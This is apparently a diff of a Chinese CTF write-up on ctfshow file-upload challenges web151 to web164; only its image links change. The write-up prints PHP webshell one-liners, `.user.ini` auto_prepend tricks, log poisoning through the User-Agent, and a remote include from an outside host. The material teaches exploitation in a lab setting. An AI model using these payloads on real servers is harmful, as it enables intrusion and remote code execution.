@@ -14,31 +14,31 @@ updated: 2026-10-24
 
 访问网站，出现如下页面：
 
-[![image-20231101181827174](https://image.3001.net/images/20240114/1705219411_65a39553cd61b4d0ece0e.png)](https://image.3001.net/images/20240114/1705219411_65a39553cd61b4d0ece0e.png)
+[![image-20231101181827174](../../../_assets/images/62e2036de5c1826de157936d45aeacd7f05f3e45ceaffe989c9e565d8287c6e4.png)](https://image.3001.net/images/20240114/1705219411_65a39553cd61b4d0ece0e.png)
 
 右键检查发现，当我们点击 button 提交的时候，会触发下框中的匿名函数，并且从该前端代码可以得知，这里只允许上传 PNG 后缀的图片。
 
-[![image-20231101182208617](https://image.3001.net/images/20240114/1705219416_65a39558a7eff3cc635ab.png)](https://image.3001.net/images/20240114/1705219416_65a39558a7eff3cc635ab.png)
+[![image-20231101182208617](../../../_assets/images/11bb55097aeeaa52347f88bac3ded67ba198b30e5b23d030bec9dae282544705.png)](https://image.3001.net/images/20240114/1705219416_65a39558a7eff3cc635ab.png)
 
 但是由于文件合法性校验发生在前端页面，故而这里我们可以进行绕过。
 
 **方法一：直接右键检查修改源码：**
 
-[![image-20231101182809316](https://image.3001.net/images/20240114/1705219991_65a39797f104c2f6393bf.png)](https://image.3001.net/images/20240114/1705219991_65a39797f104c2f6393bf.png)
+[![image-20231101182809316](../../../_assets/images/922634eab9efddb574a7d504a030a6a1a03a4d053dde3fabfd968040afcac657.png)](https://image.3001.net/images/20240114/1705219991_65a39797f104c2f6393bf.png)
 
 然后上传即可。
 
-[![image-20231101182820332](https://image.3001.net/images/20240114/1705219989_65a397958692dc6a18932.png)](https://image.3001.net/images/20240114/1705219989_65a397958692dc6a18932.png)
+[![image-20231101182820332](../../../_assets/images/7cc565223cbf2e9c3ccee3d64917657137c6078a978945e2438022dbae57928a.png)](https://image.3001.net/images/20240114/1705219989_65a397958692dc6a18932.png)
 
 **方法二：使用 Burpsuite 进行抓包：**
 
 先将 PHP 木马文件修改为以 .png 结尾的文件，接着使用 BP 抓取登陆的数据包，将文件名修改即可：
 
-[![image-20231101183138970](https://image.3001.net/images/20240114/1705219987_65a39793299c2b688c808.png)](https://image.3001.net/images/20240114/1705219987_65a39793299c2b688c808.png)
+[![image-20231101183138970](../../../_assets/images/f7c7f6ca7f375ed173ca421cc991fc99b5295e6568b4dc4e312661f4ec3aee97.png)](https://image.3001.net/images/20240114/1705219987_65a39793299c2b688c808.png)
 
 使用中国菜刀或者蚁剑连接即可，为了方便我这里直接使用 HackerBar 进行传参利用：
 
-[![image-20231101183735747](https://image.3001.net/images/20240114/1705219983_65a3978f8a647e2d82c8f.png)](https://image.3001.net/images/20240114/1705219983_65a3978f8a647e2d82c8f.png)
+[![image-20231101183735747](../../../_assets/images/fc723fb7bef01f0419bdb73d0f745019f53f58bbb158ec7e10d7a99400fa0c75.png)](https://image.3001.net/images/20240114/1705219983_65a3978f8a647e2d82c8f.png)
 
 ## web152 前端 + 后端 MIME 校验
 
@@ -46,11 +46,11 @@ updated: 2026-10-24
 
 直接上传一个 PHP 文件提示：
 
-[![image-20231101183958909](https://image.3001.net/images/20240114/1705219980_65a3978c4562c57d98eae.png)](https://image.3001.net/images/20240114/1705219980_65a3978c4562c57d98eae.png)
+[![image-20231101183958909](../../../_assets/images/0df622e9a3853bf8375c363638d25b54a0a3fb47b149cb2029b5dcafa874dfa1.png)](https://image.3001.net/images/20240114/1705219980_65a3978c4562c57d98eae.png)
 
 查看前端源码，发现这里也进行了前端的校验：
 
-[![image-20231101184224523](https://image.3001.net/images/20240114/1705219977_65a39789b88577a65ad32.png)](https://image.3001.net/images/20240114/1705219977_65a39789b88577a65ad32.png)
+[![image-20231101184224523](../../../_assets/images/86861d4dbd6de5639cdf187e07f5176f58711d6fe87ad4f3ade3a955b9f4b29f.png)](https://image.3001.net/images/20240114/1705219977_65a39789b88577a65ad32.png)
 
 直接修改前端源码之后，进行上传发现无法成功。
 
@@ -58,23 +58,23 @@ updated: 2026-10-24
 
 先直接上传 PHP 后缀的文件，页面返回：
 
-[![image-20231101184604776](https://image.3001.net/images/20240114/1705219975_65a39787ae6075946ceda.png)](https://image.3001.net/images/20240114/1705219975_65a39787ae6075946ceda.png)
+[![image-20231101184604776](../../../_assets/images/a86bbe2fb99615ec949a63464d1aff57d47ed14491ab89927ed367dcfbaf7dd4.png)](https://image.3001.net/images/20240114/1705219975_65a39787ae6075946ceda.png)
 
 通过前端代码发现，这里只要是状态码不等于 0 的，则都是上传失败的数据包。
 
-[![image-20231101184625324](https://image.3001.net/images/20240114/1705219972_65a397845ac522474db30.png)](https://image.3001.net/images/20240114/1705219972_65a397845ac522474db30.png)
+[![image-20231101184625324](../../../_assets/images/2d74408e3317f695f9684c9695802817e1dedae3baf352757b39eee9503306bc.png)](https://image.3001.net/images/20240114/1705219972_65a397845ac522474db30.png)
 
 经过测试发现，这里进行了 MIME 检测，通过修改请求头中的 `Content-Type` 字段，将其修改为 `image/png` 即可实现任意文件上传。
 
-[![image-20231101184857019](https://image.3001.net/images/20240114/1705219970_65a397823c571726ccadd.png)](https://image.3001.net/images/20240114/1705219970_65a397823c571726ccadd.png)
+[![image-20231101184857019](../../../_assets/images/e657d8a7b6bc3ddffc0bdbfbd30b049c138b38236f58371ab86533f088aa0761.png)](https://image.3001.net/images/20240114/1705219970_65a397823c571726ccadd.png)
 
 > 本关卡进行了 前端校验 + 后端的 MIME 值校验。
 >
 > 绕过方法：先上传一个后缀名为 png 的文件，接着使用 BP 抓取上传的数据包，将文件后缀 png 修改为 PHP，将 Content-Type 修改为 image/png 即可。
 
-[![image-20231101185032601](https://image.3001.net/images/20240114/1705219967_65a3977f3e3776bdf801a.png)](https://image.3001.net/images/20240114/1705219967_65a3977f3e3776bdf801a.png)
+[![image-20231101185032601](../../../_assets/images/e60ad5336922cee80bb8769cd04a8e7d5ab8e102481cca205f82251839bc6c32.png)](https://image.3001.net/images/20240114/1705219967_65a3977f3e3776bdf801a.png)
 
-[![image-20231101185355503](https://image.3001.net/images/20240114/1705219963_65a3977bdbd8aba0c0848.png)](https://image.3001.net/images/20240114/1705219963_65a3977bdbd8aba0c0848.png)
+[![image-20231101185355503](../../../_assets/images/ca843275b5bfab9701e3c322992cc5e3931b705b789e8882372e6eb092982969.png)](https://image.3001.net/images/20240114/1705219963_65a3977bdbd8aba0c0848.png)
 
 ## web153 前端 + 后端 MIME + 黑名单
 
@@ -82,19 +82,19 @@ updated: 2026-10-24
 
 经过测试发现，这里存在 **前端校验 + 后端 MIME 校验 + 黑名单**，发现可以通过修改请求头中的 `content-type` 值为 image/png，即可上传非脚本文件。
 
-[![image-20231101190228068](https://image.3001.net/images/20240114/1705219960_65a397789a145fc65d683.png)](https://image.3001.net/images/20240114/1705219960_65a397789a145fc65d683.png)
+[![image-20231101190228068](../../../_assets/images/16a512fb294ed08e7193397c97b4f8090ac8e298f0856acd4575f1c41d63d044.png)](https://image.3001.net/images/20240114/1705219960_65a397789a145fc65d683.png)
 
-[![image-20231101190250111](https://image.3001.net/images/20240114/1705219958_65a3977644a2a443bab4b.png)](https://image.3001.net/images/20240114/1705219958_65a3977644a2a443bab4b.png)
+[![image-20231101190250111](../../../_assets/images/24c87f649ee6885c50f4f4fe26b3bc7320529c46d0f8eb7c2b4b39590cf2b840.png)](https://image.3001.net/images/20240114/1705219958_65a3977644a2a443bab4b.png)
 
 但是这里直接上传 php 后缀的文件是不行的，因此存在黑名单。
 
-[![image-20231101190345149](https://image.3001.net/images/20240114/1705219956_65a397743d837bac1f1f3.png)](https://image.3001.net/images/20240114/1705219956_65a397743d837bac1f1f3.png)
+[![image-20231101190345149](../../../_assets/images/963db259918c0fa31b4b3c149abcfbbeb3c6f173a6b2170683f714bb8c0a4848.png)](https://image.3001.net/images/20240114/1705219956_65a397743d837bac1f1f3.png)
 
 尝试替换为其他可以解析 PHP 代码的文件后缀，比如 `php3`、`php4`、`php`、`phtml`、`pht` 后缀。虽然都上传成功，但是都无法解析。访问直接下载该文件。因为其服务器使用的是 nginx 搭建，故而无法解析。
 
-[![image-20231101190819687](https://image.3001.net/images/20240114/1705219953_65a397711b4e83ed4b564.png)](https://image.3001.net/images/20240114/1705219953_65a397711b4e83ed4b564.png)
+[![image-20231101190819687](../../../_assets/images/e993665001f3bc3c4c7b36d1d6167eea49d5a00aa9ee463bdafed53347c3b84a.png)](https://image.3001.net/images/20240114/1705219953_65a397711b4e83ed4b564.png)
 
-[![image-20231101190841994](https://image.3001.net/images/20240114/1705219950_65a3976e818539c807eee.png)](https://image.3001.net/images/20240114/1705219950_65a3976e818539c807eee.png)
+[![image-20231101190841994](../../../_assets/images/09090849198447ae62a273730ce89f272e84122ded8ef6a62d6d0710f92ef1b8.png)](https://image.3001.net/images/20240114/1705219950_65a3976e818539c807eee.png)
 
 这里可以尝试上传`.htaccess` 文件，但是由于服务器是使用 nginx 搭建的，故而`.htaccess` 上传无效。但是可以上传`.user.ini` 文件。
 
@@ -108,7 +108,7 @@ updated: 2026-10-24
 
 这里我们先上传 `zzz.png` 文件，内容为一句话木马：
 
-[![image-20231101191828630](https://image.3001.net/images/20240114/1705219947_65a3976ba1a3f3cda6100.png)](https://image.3001.net/images/20240114/1705219947_65a3976ba1a3f3cda6100.png)
+[![image-20231101191828630](../../../_assets/images/b9c5faac31ca074ea7dbe0c74c5198bcc700007444ce549154ab62a6452f867a.png)](https://image.3001.net/images/20240114/1705219947_65a3976ba1a3f3cda6100.png)
 
 接着我们上传 `.user.ini` 文件到服务器，文件的内容如下：
 
@@ -117,11 +117,11 @@ ini
 auto_prepend_file=zzz.png
 ```
 
-[![image-20231101192229052](https://image.3001.net/images/20240114/1705219944_65a397687d12b97f98f55.png)](https://image.3001.net/images/20240114/1705219944_65a397687d12b97f98f55.png)
+[![image-20231101192229052](../../../_assets/images/350d12a75083ed89b778798e380cd94f4e4482fa9d20eabd4d4d906235db9b79.png)](https://image.3001.net/images/20240114/1705219944_65a397687d12b97f98f55.png)
 
 在 upload 目录下存在 index.php 文件，我们直接访问该文件利用即可（这里可能需要多刷新几次）。
 
-[![image-20231101192308912](https://image.3001.net/images/20240114/1705219941_65a39765496a70c8e4580.png)](https://image.3001.net/images/20240114/1705219941_65a39765496a70c8e4580.png)
+[![image-20231101192308912](../../../_assets/images/d15fafc256aab941b381905028524b7c8b7b9bc26327e59475893d9b4f6e0cc1.png)](https://image.3001.net/images/20240114/1705219941_65a39765496a70c8e4580.png)
 
 **释义：**
 
@@ -140,7 +140,7 @@ auto_append_file =
 
 而 `.user.ini` 文件官方对他的解析：
 
-[![image-20231101192711220](https://image.3001.net/images/20240114/1705219938_65a3976288a4ecddd1917.png)](https://image.3001.net/images/20240114/1705219938_65a3976288a4ecddd1917.png)
+[![image-20231101192711220](../../../_assets/images/9bac1b7ace32162a94553e0d0d31ad3e1d5f8f7e651a6667c05bfe5c5be5cf08.png)](https://image.3001.net/images/20240114/1705219938_65a3976288a4ecddd1917.png)
 
 大概意思就是说，PHP 的 CGI/FastCGI 支持每个目录都有一个 PHP 配置文件，该配置文件就是 `.user.ini` 。
 
@@ -154,31 +154,31 @@ auto_append_file =
 
 首先，我们上传文件后缀为 `png` ；`content-type` 值为 `image/png` 的图片，内容为一句话木马，提示如下：
 
-[![image-20231101195608930](https://image.3001.net/images/20240114/1705219934_65a3975e237d0756d62f0.png)](https://image.3001.net/images/20240114/1705219934_65a3975e237d0756d62f0.png)
+[![image-20231101195608930](../../../_assets/images/4e43954dcc16398774b1f48c9355cdfdc7aba890505afa64a739c3c5b980f0f5.png)](https://image.3001.net/images/20240114/1705219934_65a3975e237d0756d62f0.png)
 
 由于后端返回的数据经过了 Unicode 编码，这里我们使用浏览器的控制台，使用 JS 中的 `alert()` 函数进行解码。
 
-[![image-20231101195739086](https://image.3001.net/images/20240114/1705219931_65a3975b3867288b71094.png)](https://image.3001.net/images/20240114/1705219931_65a3975b3867288b71094.png)
+[![image-20231101195739086](../../../_assets/images/19664ed1f51a54cbf0a8bbb995158d83457aea53f8c21975279f196c425f0074.png)](https://image.3001.net/images/20240114/1705219931_65a3975b3867288b71094.png)
 
 发现提示文件内容不合规，应该是对文件内容做了检查，优先猜测是 文件头检测，尝试加上 GIF89a 的文件头，发现问题依旧存在。
 
-[![image-20231101195908349](https://image.3001.net/images/20240114/1705219929_65a397595bd790eb86bc0.png)](https://image.3001.net/images/20240114/1705219929_65a397595bd790eb86bc0.png)
+[![image-20231101195908349](../../../_assets/images/c9c59978d4d742014c19903bbdbbee9c0d6bb734c618a5cbced389602a46c988.png)](https://image.3001.net/images/20240114/1705219929_65a397595bd790eb86bc0.png)
 
 接着尝试制作图片马进行上传：
 
-[![image-20231101200033851](https://image.3001.net/images/20240114/1705219924_65a3975486c74dc4a51f6.png)](https://image.3001.net/images/20240114/1705219924_65a3975486c74dc4a51f6.png)
+[![image-20231101200033851](../../../_assets/images/5aebd781d569c7cebb72a677138029a609675b1f7a301100620fe78f8e71aee2.png)](https://image.3001.net/images/20240114/1705219924_65a3975486c74dc4a51f6.png)
 
 将该图片马上传：
 
-[![image-20231101200259878](https://image.3001.net/images/20240114/1705219921_65a397516293d89da2a02.png)](https://image.3001.net/images/20240114/1705219921_65a397516293d89da2a02.png)
+[![image-20231101200259878](../../../_assets/images/a26fce2d1d08b7e8cd11bacc38adb3199324414a4add7bcde1e0312cc74c9f84.png)](https://image.3001.net/images/20240114/1705219921_65a397516293d89da2a02.png)
 
 发现依旧上传失败，尝试将最后木马去掉，加上一些其他字符。发现上传成功。
 
-[![image-20231101200409601](https://image.3001.net/images/20240114/1705219907_65a39743d8c4f7f2aae02.png)](https://image.3001.net/images/20240114/1705219907_65a39743d8c4f7f2aae02.png)
+[![image-20231101200409601](../../../_assets/images/2455663971731afec51d94be375f643e7bd37a87017c1cd0996c0739063d7788.png)](https://image.3001.net/images/20240114/1705219907_65a39743d8c4f7f2aae02.png)
 
 尝试把 `<?php` 加上，发现上传失败：
 
-[![image-20231101200509005](https://image.3001.net/images/20240114/1705219904_65a3974004f4002a54391.png)](https://image.3001.net/images/20240114/1705219904_65a3974004f4002a54391.png)
+[![image-20231101200509005](../../../_assets/images/4d737b673245505d4e65854d00f1e49ee3b4437fe12323bd6bed80bc5b18954e.png)](https://image.3001.net/images/20240114/1705219904_65a3974004f4002a54391.png)
 
 发现问题的所在，这里不能带有 `<?php` 字样，这里我们要说一下，如果服务器的 PHP 开启短标签或 asp 标签，我们可以不适用 `<?php` 即可解析 PHP 代码。
 
@@ -191,7 +191,7 @@ php
 <script language="php">phpinfo();</script>
 ```
 
-[![image-20231101223728646](https://image.3001.net/images/20240114/1705219899_65a3973b7c5b0eb635867.png)](https://image.3001.net/images/20240114/1705219899_65a3973b7c5b0eb635867.png)
+[![image-20231101223728646](../../../_assets/images/e2db608bf2909f3c29e9b9ccdd28dfaf5bc2411288ed47d22171a1410543cf71.png)](https://image.3001.net/images/20240114/1705219899_65a3973b7c5b0eb635867.png)
 
 在 PHP 全版本中使用如下方法也可以解析 PHP 代码：
 
@@ -200,7 +200,7 @@ php
 <?=phpinfo();?>
 ```
 
-[![image-20231101223832204](https://image.3001.net/images/20240114/1705219896_65a397389d466c342d5ae.png)](https://image.3001.net/images/20240114/1705219896_65a397389d466c342d5ae.png)
+[![image-20231101223832204](../../../_assets/images/1e6b8b0ca269bb71d56b40277bcf371e93a0bfa9cf22539d92667ad7508e75ed.png)](https://image.3001.net/images/20240114/1705219896_65a397389d466c342d5ae.png)
 
 通过服务器响应内容发现，这里是 PHP7 版本的，因此不能使用第一种方法，我们可以使用第二种方法绕过。
 
@@ -208,15 +208,15 @@ php
 
 先上传后缀为 png 的一句话木马文件：
 
-[![image-20231101224440104](https://image.3001.net/images/20240114/1705219894_65a3973661c3cee3c06cb.png)](https://image.3001.net/images/20240114/1705219894_65a3973661c3cee3c06cb.png)
+[![image-20231101224440104](../../../_assets/images/0db55dee8bbaa7482b99c5f0e959f8a1d6433bb54f25a0f3a6f475d93e9e5b42.png)](https://image.3001.net/images/20240114/1705219894_65a3973661c3cee3c06cb.png)
 
 其次再上传 `.user.ini` 文件：
 
-[![image-20231101224539204](https://image.3001.net/images/20240114/1705219891_65a39733c053c930c3873.png)](https://image.3001.net/images/20240114/1705219891_65a39733c053c930c3873.png)
+[![image-20231101224539204](../../../_assets/images/a78a9504334c4e392f60021c72ef7ba0b5df946096ff542ef8255863b65870c1.png)](https://image.3001.net/images/20240114/1705219891_65a39733c053c930c3873.png)
 
 访问与`.user.ini` 同目录下的 index.php 文件，则自动包含图片马文件：
 
-[![image-20231101224706801](https://image.3001.net/images/20240114/1705219890_65a397324bb5152738b35.png)](https://image.3001.net/images/20240114/1705219890_65a397324bb5152738b35.png)
+[![image-20231101224706801](../../../_assets/images/ca5cf03e04930488075caf4d52c28b99330e0be648f746cc7ef3290dcf03c548.png)](https://image.3001.net/images/20240114/1705219890_65a397324bb5152738b35.png)
 
 ## web155 前端 + 后端 MIME + 黑名单 + 内容检查 php
 
@@ -229,7 +229,7 @@ ini
 auto_prepend_file=x1ong.png
 ```
 
-[![image-20231102100654913](https://image.3001.net/images/20240114/1705219887_65a3972f56a9637b5a3b4.png)](https://image.3001.net/images/20240114/1705219887_65a3972f56a9637b5a3b4.png)
+[![image-20231102100654913](../../../_assets/images/e56e5a9ff13973c26c171cce9b153e0dd8bd9c22351ebf0ee895b82256a163ac.png)](https://image.3001.net/images/20240114/1705219887_65a3972f56a9637b5a3b4.png)
 
 其次上传 `x1ong.png` 文件，内容如下：
 
@@ -238,11 +238,11 @@ php
 <?=@eval($_REQUEST["cmd"]);?>
 ```
 
-[![image-20231102101028861](https://image.3001.net/images/20240114/1705219884_65a3972c6fee25a1f7e47.png)](https://image.3001.net/images/20240114/1705219884_65a3972c6fee25a1f7e47.png)
+[![image-20231102101028861](../../../_assets/images/178f26cc14f06c3c8d5fdefd67a84f7e6a0fae57b60f281115fc4aff7bbfa42a.png)](https://image.3001.net/images/20240114/1705219884_65a3972c6fee25a1f7e47.png)
 
 最后利用即可：
 
-[![image-20231102101739553](https://image.3001.net/images/20240114/1705219882_65a3972a4835f343f140e.png)](https://image.3001.net/images/20240114/1705219882_65a3972a4835f343f140e.png)
+[![image-20231102101739553](../../../_assets/images/903a232de34515447ce6cb050c94449e938238ef72a59396694d1ab83db29359.png)](https://image.3001.net/images/20240114/1705219882_65a3972a4835f343f140e.png)
 
 其实这里也是支持短标签解析的。
 
@@ -257,13 +257,13 @@ php
 
 但是，我们可以使用 `{}` 代替 `[]`，可以达到一样的效果。
 
-[![image-20231102102630935](https://image.3001.net/images/20240114/1705219878_65a39726efe20d68ec034.png)](https://image.3001.net/images/20240114/1705219878_65a39726efe20d68ec034.png)
+[![image-20231102102630935](../../../_assets/images/d9779c8447cf267d8668b50a1874b11521361eec820b8b254c3d5ae48bbec418.png)](https://image.3001.net/images/20240114/1705219878_65a39726efe20d68ec034.png)
 
-[![image-20231102102420436](https://image.3001.net/images/20240114/1705219876_65a39724b13bfe69cba8d.png)](https://image.3001.net/images/20240114/1705219876_65a39724b13bfe69cba8d.png)
+[![image-20231102102420436](../../../_assets/images/d34a3f098c6dbecd0d466688169db3f89bf169a285139490b9a40935ee073757.png)](https://image.3001.net/images/20240114/1705219876_65a39724b13bfe69cba8d.png)
 
 这里同样上传 `.user.ini` 配置文件。
 
-[![image-20231102102810651](https://image.3001.net/images/20240114/1705219874_65a39722e4f879e16defc.png)](https://image.3001.net/images/20240114/1705219874_65a39722e4f879e16defc.png)
+[![image-20231102102810651](../../../_assets/images/eadef57288010cf978293a38f633a9ad624cd486c79feba7e398f05783db5de1.png)](https://image.3001.net/images/20240114/1705219874_65a39722e4f879e16defc.png)
 
 ## web157-158 反引号执行命令
 
@@ -271,13 +271,13 @@ php
 
 但是放出了反引号，在 PHP 中，我们也可以使用反引号达到命令执行的效果，如下：
 
-[![image-20231102104155610](https://image.3001.net/images/20240114/1705219872_65a39720797ecd0869013.png)](https://image.3001.net/images/20240114/1705219872_65a39720797ecd0869013.png)
+[![image-20231102104155610](../../../_assets/images/ea7b11147580f265c1cb2f54e6479b74a630b23c700bdd16105b296a35201342.png)](https://image.3001.net/images/20240114/1705219872_65a39720797ecd0869013.png)
 
 但是这里由于过滤了 `echo` 关键字，没有 `echo` 关键字，以上方法是行不通的。
 
 不过在 PHP 表达式写法中，可以不使用 `echo` 关键字，即可使用反引号达到命令执行的效果，如下：
 
-[![image-20231102104536424](https://image.3001.net/images/20240114/1705219870_65a3971ed64a11f297a93.png)](https://image.3001.net/images/20240114/1705219870_65a3971ed64a11f297a93.png)
+[![image-20231102104536424](../../../_assets/images/ba9a5b6523f1dc1f31cf5cb9348fc0d73b398b372df9e444ad447911dfb2d656.png)](https://image.3001.net/images/20240114/1705219870_65a3971ed64a11f297a93.png)
 
 因此，我们这里依旧上传 `.user.ini` 包含 `x1ong.png` 文件，内容如下：
 
@@ -286,9 +286,9 @@ php
 <?=`tac /var/www/html/flag.*`?>
 ```
 
-[![image-20231102103635313](https://image.3001.net/images/20240114/1705219852_65a3970c06f7bf0b5591e.png)](https://image.3001.net/images/20240114/1705219852_65a3970c06f7bf0b5591e.png)
+[![image-20231102103635313](../../../_assets/images/490b7ee9aeb9b98baedbef48e79900d567e42b22d49181178fd41d7f0bf61573.png)](https://image.3001.net/images/20240114/1705219852_65a3970c06f7bf0b5591e.png)
 
-[![image-20231102104708880](https://image.3001.net/images/20240114/1705219849_65a3970908ce70e291e49.png)](https://image.3001.net/images/20240114/1705219849_65a3970908ce70e291e49.png)
+[![image-20231102104708880](../../../_assets/images/b346d6c19a31d6f11b733edbf813d8af1fe80bf4d744a7c43fbec20d0bba7247.png)](https://image.3001.net/images/20240114/1705219849_65a3970908ce70e291e49.png)
 
 ## web159 反引号执行命令
 
@@ -301,15 +301,15 @@ php
 <?=`cat /var/www/html/flag.*`?>
 ```
 
-[![image-20231102110210300](https://image.3001.net/images/20240114/1705219845_65a39705c70f2e85b371b.png)](https://image.3001.net/images/20240114/1705219845_65a39705c70f2e85b371b.png)
+[![image-20231102110210300](../../../_assets/images/565f625ad5d7f3bce80f7e3eb6eb2bd0847e793d3064df586b703f550544b47e.png)](https://image.3001.net/images/20240114/1705219845_65a39705c70f2e85b371b.png)
 
-[![image-20231102110340403](https://image.3001.net/images/20240114/1705219843_65a397039b337c2e1c159.png)](https://image.3001.net/images/20240114/1705219843_65a397039b337c2e1c159.png)
+[![image-20231102110340403](../../../_assets/images/6d0003b6b9b6f29a1491bb6a4bfa00e3c87000673c82bf7e1b45d78ead9bca8f.png)](https://image.3001.net/images/20240114/1705219843_65a397039b337c2e1c159.png)
 
 ## web160 日志包含
 
 经过测试，这里重点过滤了 左右括号，因此传统的手法是使用不了的，这里尝试 日志文件包含，但是发现过滤了 `log` 关键字。
 
-[![image-20231102111347723](https://image.3001.net/images/20240114/1705219841_65a397012113b8a89bc94.png)](https://image.3001.net/images/20240114/1705219841_65a397012113b8a89bc94.png)
+[![image-20231102111347723](../../../_assets/images/ebb96488c0fa3d054fb901f6566639e5069ff2dd11b918b50891f0077474076d.png)](https://image.3001.net/images/20240114/1705219841_65a397012113b8a89bc94.png)
 
 但是可以进行拼接绕过，最终的代码如下：
 
@@ -318,17 +318,17 @@ php
 <?=include"/var/lo"."g/nginx/access.l"."og"?>
 ```
 
-[![image-20231102111522254](https://image.3001.net/images/20240114/1705219837_65a396fd35540ac0f4813.png)](https://image.3001.net/images/20240114/1705219837_65a396fd35540ac0f4813.png)
+[![image-20231102111522254](../../../_assets/images/4a448a480be6dbbf9b7652cd1e0358811a45c422f77f8418322e3011a5957d94.png)](https://image.3001.net/images/20240114/1705219837_65a396fd35540ac0f4813.png)
 
 访问 upload 目录下的 index.php 文件，发现成功包含日志：
 
-[![image-20231102111813485](https://image.3001.net/images/20240114/1705219835_65a396fb4a3bf9873aaed.png)](https://image.3001.net/images/20240114/1705219835_65a396fb4a3bf9873aaed.png)
+[![image-20231102111813485](../../../_assets/images/198a13104361e99cf90ab4feb4fbad898f4775caff1b1a1ca1948d1f3c7fefbf.png)](https://image.3001.net/images/20240114/1705219835_65a396fb4a3bf9873aaed.png)
 
 我们修改 UA 字段为一句话木马，之后利用即可：
 
-[![image-20231102112917503](https://image.3001.net/images/20240114/1705219833_65a396f912b2562c63416.png)](https://image.3001.net/images/20240114/1705219833_65a396f912b2562c63416.png)
+[![image-20231102112917503](../../../_assets/images/07cfbf949b971b316080956d0a2119c0b288fe983e863422c2220ff9106fd540.png)](https://image.3001.net/images/20240114/1705219833_65a396f912b2562c63416.png)
 
-[![image-20231102113006577](https://image.3001.net/images/20240114/1705219830_65a396f6a79bfe32a4f97.png)](https://image.3001.net/images/20240114/1705219830_65a396f6a79bfe32a4f97.png)
+[![image-20231102113006577](../../../_assets/images/0c2e7fa8a0abb78f902641d6960be5771ba4fa975895dcb6cbe31c012e894f34.png)](https://image.3001.net/images/20240114/1705219830_65a396f6a79bfe32a4f97.png)
 
 ## web161 日志包含文件头校验
 
@@ -336,13 +336,13 @@ php
 
 这里我们可以直接加上 GIF 图片的文件头 `GIF89a` 进行上传即可：
 
-[![image-20231105144033069](https://image.3001.net/images/20240114/1705219826_65a396f2e7a3dda1c4947.png)](https://image.3001.net/images/20240114/1705219826_65a396f2e7a3dda1c4947.png)
+[![image-20231105144033069](../../../_assets/images/b8ba9ec36c5121b331baa8a818d646a12cecd0263c61ac1b4e4ab07e98f63790.png)](https://image.3001.net/images/20240114/1705219826_65a396f2e7a3dda1c4947.png)
 
 当然这里也可以使用图片马的形式进行上传。
 
 接着再上传一个 `.user.ini` 文件即可：
 
-[![image-20231105144229589](https://image.3001.net/images/20240114/1705219824_65a396f04087add58718e.png)](https://image.3001.net/images/20240114/1705219824_65a396f04087add58718e.png)
+[![image-20231105144229589](../../../_assets/images/9685cda3c5c899bee6f5f01ab4285adc6ccb6f12a6862543114621fc0f7c99c6.png)](https://image.3001.net/images/20240114/1705219824_65a396f04087add58718e.png)
 
 内容如下：
 
@@ -354,7 +354,7 @@ auto_prepend_file=x1ong.png
 
 接着访问 upload 目录下的 index.php 文件：
 
-[![image-20231105144331213](https://image.3001.net/images/20240114/1705219819_65a396eb5207cd3c60a63.png)](https://image.3001.net/images/20240114/1705219819_65a396eb5207cd3c60a63.png)
+[![image-20231105144331213](../../../_assets/images/362dfea2c5575053cd639ccfce01d3ae790eb1f4d76c3b5b7077f3ebb7858b65.png)](https://image.3001.net/images/20240114/1705219819_65a396eb5207cd3c60a63.png)
 
 成功包含日志。
 
@@ -392,7 +392,7 @@ bash
 python3 -m flask run --host=0.0.0.0 --port=80
 ```
 
-[![image-20231107114307129](https://image.3001.net/images/20240114/1705219811_65a396e3ad909ca051e15.png)](https://image.3001.net/images/20240114/1705219811_65a396e3ad909ca051e15.png)
+[![image-20231107114307129](../../../_assets/images/a87fe9c9e530c9a3c2763dfe6cc14468090c87f5f0947b0ba5019c6e8178ed09.png)](https://image.3001.net/images/20240114/1705219811_65a396e3ad909ca051e15.png)
 
 **解题：**
 
@@ -404,7 +404,7 @@ GIF89a
 auto_prepend_file=x1ong
 ```
 
-[![image-20231107114455245](https://image.3001.net/images/20240114/1705219587_65a396037c6fafa0fbb70.png)](https://image.3001.net/images/20240114/1705219587_65a396037c6fafa0fbb70.png)
+[![image-20231107114455245](../../../_assets/images/43ec796c4fb6dbcd31d034f448a99b4ceefae225914ce85d73f388febb1c1078.png)](https://image.3001.net/images/20240114/1705219587_65a396037c6fafa0fbb70.png)
 
 1. 上传名为 `x1ong` 内容如下的文件：
 
@@ -413,11 +413,11 @@ php
 <?=include"http://148572975"?>
 ```
 
-[![image-20231107150237133](https://image.3001.net/images/20240114/1705219585_65a396011faab1f707dc2.png)](https://image.3001.net/images/20240114/1705219585_65a396011faab1f707dc2.png)
+[![image-20231107150237133](../../../_assets/images/083de3d30ca94180a0121f144234f6878d05189097a180a74ed6f8a9c16a87b0.png)](https://image.3001.net/images/20240114/1705219585_65a396011faab1f707dc2.png)
 
 1. 利用即可
 
-[![image-20231107150420362](https://image.3001.net/images/20240114/1705219582_65a395fe974d085816126.png)](https://image.3001.net/images/20240114/1705219582_65a395fe974d085816126.png)
+[![image-20231107150420362](../../../_assets/images/717706d4992e33a3f7c30d34b3662e069146f1b2e53c15c119caf59cfd94fca3.png)](https://image.3001.net/images/20240114/1705219582_65a395fe974d085816126.png)
 
 > web163 与 web162 略微有点区别，web163 在上传 `x1ong` 文件的时候，会立即删除，这里我们需要进行竞争。暴破一直发送。
 >
@@ -425,9 +425,9 @@ php
 
 **web163：**
 
-[![image-20231107152709143](https://image.3001.net/images/20240114/1705219580_65a395fc2f6b77e0ffeb7.png)](https://image.3001.net/images/20240114/1705219580_65a395fc2f6b77e0ffeb7.png)
+[![image-20231107152709143](../../../_assets/images/9f4ace6135310cd7f1a8739e94756821dff353e331c354726f659796f281cc60.png)](https://image.3001.net/images/20240114/1705219580_65a395fc2f6b77e0ffeb7.png)
 
-[![image-20231107153022074](https://image.3001.net/images/20240114/1705219578_65a395fa7510fd004e604.png)](https://image.3001.net/images/20240114/1705219578_65a395fa7510fd004e604.png)
+[![image-20231107153022074](../../../_assets/images/aac2e9ff7e38e76e7bce25b25ea84aa07d876963f31cf374127c6cb74df77e37.png)](https://image.3001.net/images/20240114/1705219578_65a395fa7510fd004e604.png)
 
 ## web164 PNG 二次渲染绕过
 
@@ -462,21 +462,21 @@ imagepng($img,'1.png'); #保存在本地的图片马
 
 将以上代码保存为文件 `generatePng.php` ，接着运行即可得到 `1.png`， 该图片则是一个图片马。
 
